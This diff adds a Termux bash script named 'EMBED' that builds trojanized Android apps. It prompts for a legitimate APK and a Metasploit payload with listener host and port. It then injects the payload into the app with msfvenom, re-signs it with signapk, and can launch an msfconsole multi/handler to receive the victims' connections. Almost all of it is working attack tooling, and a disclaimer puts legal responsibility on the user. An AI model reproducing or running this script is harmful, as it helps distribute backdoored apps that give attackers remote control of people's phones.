@@ -1,0 +1,237 @@
+#!/data/data/com.termux/files/usr/bin/bash
+set -euo pipefail
+IFS=$'\n\t'
+#trap ctrl_c 2
+function ctrl_c () {
+                echo "
+		"
+                printf "$yellow [!]$red Going me on https://t.me/Ivam3by_Cinderella$reset
+                \n"
+        }
+
+# VAR
+	R='\033[1;31m'
+        G='\033[1;32m'
+        Y='\033[1;33m'
+        B='\033[1;34m'
+	M='\033[1;35m'
+        C='\033[1;36m'
+        W='\033[0m'
+	TMP_DIR=$HOME/java
+	unsign=$(find $TMP_DIR/unsigned -name "output.apk")
+
+function Banner {
+	echo $(clear)
+	printf "$Y"
+	echo "   ._____ __  __ ____  _____ ____"
+	echo "   | ____|  \/  | __ )| ____|  _ \ "
+	echo "   |  _| |      |  _ \|  _| | | | |"
+	echo "   | |___| |\/| | |_) | |___| |_| |"
+	echo "   |_____|_|  |_|____/|_____|____/ v.1.0"
+	printf "$W
+	\n"
+}
+
+function Chao_chao {
+	echo $(clear)
+        echo "
+        "
+        printf "$C"
+        echo "#-----THANKS TO MY MASTER CINDERELLA-----#"
+        echo "#                                        #"
+        echo "#             People don't die           #"
+        echo "#    If they still live in the hearts    #"
+        echo "#           of their loved ones          #"
+	echo "#       We love her ... We miss her      #"
+        echo "#                                        #"
+        echo "#-------------------RIP------------------#"
+	printf "$W"
+        echo "
+        "
+}
+
+function SET {
+	Banner
+printf "$C [IbyC]$W Let's to configure it
+	\n"
+	sleep 2
+
+printf "$C [Set]$G LEGITIM .APK$W"
+	while read -p " >> " APK && [ -z $APK ]; do
+		printf "\n $R
+		[W] O-ops!! Please set some legitim .Apk
+		$W \n"
+	done
+			if [ ! -e $APK ]; then
+				printf "$R [W] O-ops!! the .Apk doesn't exist
+				$W \n"
+				sleep 2
+				SET
+			fi
+
+printf "$C [Set]$G PAYLOAD$W"
+	while read -p " >> " PAYLOAD && [ -z $PAYLOAD ]; do
+		printf "\n $R
+		[W] O-ops!! Please set a payload
+		$W \n"
+	done
+
+printf "$C [Set]$G LOCAL HOST$W"
+        while read -p " >> " LHOST && [ -z $LHOST ]; do
+                printf "\n $R
+                [W] O-ops!! Please set a host
+                $W \n"
+	done
+
+printf "$C [Set]$G LOCAL PORT$W"
+        while read -p " >> " LPORT && [ -z $LPORT ]; do
+                printf "\n $R
+                [W] O-ops!! Please set a local port
+                $W \n"
+        done
+
+printf "$C [Set]$G NAMED YOUR .APK$W"
+	while read -p " >> " MYAPK && [ -z $MYAPK ]; do
+		printf "\n $R
+		[W] O-ops!! Please set a name
+		$W \n"
+			if [ ! -e $MYAPK ]; then
+                                printf "$R [W] O-ops!! The apk files doesn't exist
+                                $W \n"
+				sleep 2
+				SET
+                        fi
+	done
+}
+
+function Msfconsole {
+	echo
+	printf "$C [IbyC]$W Starting msfconsole . . ."
+                                echo "
+                                "
+                                        if [ -e $TMP_DIR/.embed/handler.rc ]; then
+                                                rm $TMP_DIR/.embed/handler.rc
+                                        else
+                                                touch $TMP_DIR/.embed/handler.rc
+                                        fi
+                                echo "use multi/handler" >> $TMP_DIR/.embed/handler.rc
+                                echo "set PAYLOAD $PAYLOAD" >> $TMP_DIR/.embed/handler.rc
+                                echo "set LHOST $LHOST" >> $TMP_DIR/.embed/handler.rc                                                         echo "set LPORT $LPORT" >> $TMP_DIR/.embed/handler.rc
+                                echo "run" >> $TMP_DIR/.embed/handler.rc
+                                echo "
+                                \n"
+                                        msfconsole -q -r $TMP_DIR/.embed/handler.rc
+}
+
+echo $(clear)
+        printf "$C"
+        echo "         -{ IbyC > EMBED } "
+        echo "   -{ SO > Android - Only for Termux } "
+        echo "              -{ Coded by } "
+        printf "$G"
+printf "$G"
+        echo "      =============================="
+        echo "      .___.                 ______,"
+        echo "      |   |__ ______   ___  \_____ \ "
+        echo "      |   \ \/ /\__ \ /   \   _(__ <,"
+        echo "      |   |\   / __ \| Y Y \ /      \ "
+        echo "      |___| \_/ (____|__|_| /______ /"
+        echo "                     \/    \/      \/ "
+        echo "      ====== By ___ Cinderella ======"
+        echo
+printf "$C"
+        echo "          [---] Join me on [---]"
+        echo "[-] www.youtube.com/c/ivam3bycinderella [-]"
+        echo "            [-] t.me/ivam3 [-]"
+        echo "
+        "
+printf "$R"
+        echo "          [---] DISCLAIMER [---]"
+printf "$W"
+        echo " This script will embed a Metasploit payload"
+        echo "         in an original .Apk file
+        "
+        echo " If the law is violated with it's use,"
+        echo "  This would be the responsibility of "
+        echo "        the user who handled it
+        "
+printf "$R       [-] Use At Your Own Risk [-]"
+        echo
+        echo
+        printf "        $C Press$G enter$C to continue$W"
+        read enter
+	SET
+        echo "
+
+        "
+Banner
+printf "$C [IbyC]$W Creating payload . . .
+/n"
+	msfvenom -x $APK -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT
+		
+printf "$C [IbyC]$W Signing the .Apk . . ."
+	cd $HOME/
+	sleep 3
+	signapk publickey.x509.pem publickey.pk8 $TMP_DIR/unsigned/output.apk $TMP_DIR/finished/$MYAPK
+	rm $TMP_DIR/unsigned/output.apk
+        
+review=$(find $TMP_DIR/finished/ -name "$MYAPK")
+	if [ -z $review ]; then
+		Chao_chao
+		printf "$R \n [W] O-ops!! Something was wrong \n $Y [!] If you need a help come to my feedback group in Telegram \n $B     >> https://t.me/Ivam3by_Cinderella
+                $W \n"
+	else
+		Chao_chao
+		printf "$Y \n [!] Finished !! \n \t $C You can find$G $MYAPK $C in$W $TMP_DIR/finished
+		\n"
+	fi
+
+printf "$C [IbyC]$W Do you wanna start msfconsole handler?
+\n"
+	while read -p " (y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
+		printf "\n $R
+		[W] Please, choose an option
+		$W \n"
+done
+                if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
+                        Chao_chao
+			printf "$C [IbyC]$W Do you wanna use the previous configurcion ?
+			\n"
+			while read -p " (y|Y/n|N) >> " yesorno && [ -z $yesorno ]; do
+				printf "\n $R
+				[W] Please, choose an option
+				$W \n"
+			done
+			if [ $yesorno = 'y' -o $yesorno = 'Y' ] ; then
+				Chao_chao
+				Msfconsole
+			else
+				printf "$C [Set]$G PAYLOAD$W"
+				while read -p " >> " PAYLOAD && [ -z $PAYLOAD ]; do
+					printf "\n $R
+					[W] O-ops!! Please set a payload
+					$W \n"
+				done
+				printf "$C [Set]$G LOCAL HOST$W"
+				while read -p " >> " LHOST && [ -z $LHOST ]; do
+					printf "\n $R
+					[W] O-ops!! Please set a host
+					$W \n"
+				done
+				printf "$C [Set]$G LOCAL PORT$W"
+				while read -p " >> " LPORT && [ -z $LPORT ]; do
+					printf "\n $R
+					[W] O-ops!! Please set a local port
+					$W \n"
+				done
+				Msfconsole
+			fi
+
+                else
+			printf "$C [IbyC]$G Thanks to use my EMBED tool
+			\n"
+			printf "$C [IbyC]$G Have a nice hacking day!!
+		$W \n"
+	fi
+
+#					@IbyC.
